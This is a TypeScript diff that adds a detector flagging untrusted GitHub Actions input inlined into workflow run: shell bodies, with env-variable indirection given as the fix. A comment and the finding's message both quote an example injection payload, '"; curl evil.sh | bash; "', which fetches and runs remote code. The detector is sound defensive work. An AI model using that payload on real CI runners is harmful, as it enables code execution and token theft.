@@ -418,6 +418,90 @@ export function detectCiYmlMissingActionlint(cwd: string): PreflightFinding | nu
 }
 
 /**
+ * Detect an untrusted GitHub Actions expression interpolated directly into a `run:` shell
+ * body in `.github/workflows/ci.yml` — the classic GHA script-injection sink. A PR titled
+ * `"; curl evil.sh | bash; "` expands into the runner's shell when `${{ github.event.* }}`
+ * (or `github.head_ref`) is inlined into `run:` text. The safe form is env-indirection: map
+ * the value to an `env:` var and reference `$VAR` (GitHub runtime-expands env values and never
+ * re-parses them as shell). ci.yml is Tier-3 seed-or-print — bkit's template was hardened but
+ * never back-fills an existing consumer, so a repo seeded before the fix keeps the vulnerable
+ * inline form with only a generic drift nudge. This surfaces it as a dedicated security finding.
+ *
+ * Line-based (no YAML dep, like the sibling ci.yml detectors): tracks `run:` blocks by
+ * indentation and flags untrusted expressions inside their bodies only. `env:` / `if:` /
+ * `with:` / `concurrency:` contexts are NOT run bodies, so the safe env-indirection form does
+ * not fire; a YAML-commented `run:` key never opens a body, so shipped commented stubs stay
+ * silent. Only scans a bkit-managed ci.yml (markers present).
+ */
+export function detectCiYmlRunInjection(cwd: string): PreflightFinding | null {
+  const ciPath = path.join(cwd, ".github", "workflows", "ci.yml");
+  if (!fs.existsSync(ciPath)) return null;
+  const content = fs.readFileSync(ciPath, "utf-8");
+  if (!/^\s*# bkit:start\b/m.test(content)) return null;
+
+  // Attacker-controllable payload contexts: any github.event.* field and github.head_ref.
+  // github.base_ref / github.event_name / SHAs are constrained values, intentionally excluded
+  // so the shipped commented stubs (which reference github.base_ref) do not false-positive.
+  const UNTRUSTED = /\$\{\{[^}]*\b(?:github\.event\.[\w.]+|github\.head_ref)\b[^}]*\}\}/;
+
+  const indentOf = (l: string): number => l.length - l.replace(/^[ \t]*/, "").length;
+  const hits: string[] = [];
+  let runKeyIndent: number | null = null; // indent of an active `run:` key; its body is deeper
+
+  for (const line of content.split("\n")) {
+    if (runKeyIndent !== null) {
+      if (line.trim() === "") continue; // blank lines belong to the block scalar
+      if (indentOf(line) <= runKeyIndent) {
+        runKeyIndent = null; // block ended — re-examine this line below
+      } else {
+        if (UNTRUSTED.test(line)) hits.push(line.trim());
+        continue;
+      }
+    }
+    if (/^\s*#/.test(line)) continue; // a commented `run:` key never opens a body
+    // `run:` may be the first key of a `- ` list item (`- run: |`), which shifts the real
+    // key column; body membership is measured from the `run:` token, not the line start, so a
+    // sibling key (`env:` / `if:`) at the run: column correctly closes the block.
+    const m = /^([ \t]*)(-[ \t]+)?run:[ \t]*(.*)$/.exec(line);
+    if (!m) continue;
+    const keyIndent = (m[1] ?? "").length + (m[2] ?? "").length;
+    const rest = (m[3] ?? "").trim();
+    if (rest === "" || /^[|>]/.test(rest)) {
+      runKeyIndent = keyIndent; // block scalar (`run: |` / `run: >`) — body follows
+    } else if (UNTRUSTED.test(rest)) {
+      hits.push(line.trim()); // inline `run: <cmd with ${{ … }}>`
+    }
+  }
+
+  if (hits.length === 0) return null;
+  const shown = hits
+    .slice(0, 3)
+    .map((h) => `  ${h}`)
+    .join("\n");
+  const more = hits.length > 3 ? `\n  … (+${hits.length - 3} more)` : "";
+  return {
+    id: "ci-yml-run-injection",
+    severity: "advisory",
+    detect:
+      "SECURITY: .github/workflows/ci.yml interpolates untrusted GitHub Actions input " +
+      "(github.event.* / github.head_ref) directly into a run: shell body — a script-injection " +
+      'sink. A PR title or branch name like `"; curl evil.sh | bash; "` then runs on your CI ' +
+      `runner (which holds GITHUB_TOKEN):\n${shown}${more}`,
+    action:
+      "Route each untrusted value through an env: var and reference it as a shell variable — " +
+      "GitHub runtime-expands env values and never re-parses them as shell, closing the injection:\n\n" +
+      "    - name: <step>\n" +
+      "      env:\n" +
+      "        PR_TITLE: ${{ github.event.pull_request.title }}\n" +
+      "      run: |\n" +
+      '        MSG="$PR_TITLE"   # NOT MSG="${{ github.event.pull_request.title }}"\n\n' +
+      "Apply the same env-indirection to every flagged line (github.event.*, github.head_ref). " +
+      "bkit's current ci.yml template already uses this form — re-sync the affected steps from " +
+      "node_modules/@cbartens/bkit/.bkit/templates/.github/workflows/ci.yml if you seeded before the hardening.",
+  };
+}
+
+/**
  * Detect drift of the consumer's `bkit-tests-check` capstone from bkit's canonical
  * CI contract. ci.yml is Tier-3 seed-or-print (consumer-owned, freely edited) — bkit
  * never rewrites it, so over time a copy can silently lose a load-bearing invariant and
@@ -886,10 +970,24 @@ export function detectBkitStubs(cwd: string): PreflightFinding[] {
       new RegExp(`(^|\\n)\\s{2}${jobName}:\\s*(\\n|$)`).test(ciContent);
     const legacyJobs = ["bkit-decide", "bkit-tests-migrate"].filter(hasLegacyJob);
     if (legacyJobs.length > 0) {
+      // docs/testing.md is bkit-managed and refreshes on every upgrade, so it already names
+      // the CURRENT jobs (bkit-tests-scope / bkit-tests-migration) while this Tier-3 ci.yml —
+      // which upgrade never rewrites — still names the legacy ones. Make that docs-vs-CI skew
+      // explicit when the managed docs are present and already migrated, so the mismatch is a
+      // stated finding rather than something an agent has to spot for itself. readOnce reuses
+      // the cache + baseline read-guard (no new error-obscuring catch).
+      const testingDoc = readOnce("docs/testing.md");
+      const docsSkew =
+        !!testingDoc &&
+        (testingDoc.includes("bkit-tests-scope") || testingDoc.includes("bkit-tests-migration"));
       findings.push({
         id: "ci-legacy-scaffold-job-names",
         severity: "advisory",
-        detect: `.github/workflows/ci.yml defines the legacy scaffold job${legacyJobs.length > 1 ? "s" : ""} ${legacyJobs.join(" + ")} — renamed in the current scaffold.`,
+        detect:
+          `.github/workflows/ci.yml defines the legacy scaffold job${legacyJobs.length > 1 ? "s" : ""} ${legacyJobs.join(" + ")} — renamed in the current scaffold.` +
+          (docsSkew
+            ? " docs/testing.md (bkit-managed, refreshed on upgrade) already names the current jobs, so docs and ci.yml now describe DIFFERENT job names — an agent reading the docs will not find the jobs they reference."
+            : ""),
         action:
           "Rename `bkit-decide` -> `bkit-tests-scope` and `bkit-tests-migrate` -> `bkit-tests-migration` (job key, `name:`, and every `needs:` / `fromJSON(needs.<job>.outputs.plan)` reference). ALSO rename the planner's plan-emitting step `id: decide` -> `id: scope` and its `steps.decide.outputs.plan` reader in the job's `outputs:` block — the id is job-local, so this is a self-contained edit with no cross-job fan-out. WHY: every scaffold job then shares the bkit-tests-* namespace that bkit's CI-Dispatch Gate polls to confirm CI dispatched for a pushed HEAD. THEN: bkit-tests-scope is the planner, NOT a test lane, but it now lives in the lane namespace — make sure your capstone still asserts its `result` explicitly and that any guard looping over bkit-tests-* jobs exempts it by name, or a scope failure leaves the capstone green. Branch protection is unaffected (the required check stays bkit-tests-check).",
       });
@@ -2598,6 +2696,11 @@ export function runPostInstallCheck(
   // ci.yml missing actionlint (GHA-aware lint; yaml.safe_load is not sufficient).
   const ciActionlint = detectCiYmlMissingActionlint(cwd);
   if (ciActionlint) phase3.push(ciActionlint);
+
+  // ci.yml untrusted input inlined into a run: body (GHA script-injection sink). Tier-3
+  // seed-or-print never back-fills the template's env-indirection fix onto older consumers.
+  const ciRunInjection = detectCiYmlRunInjection(cwd);
+  if (ciRunInjection) phase3.push(ciRunInjection);
 
   // ci.yml capstone drifted from canonical contract (warning-only presence checks).
   const capstoneDrift = detectCiYmlCapstoneContractDrift(cwd);
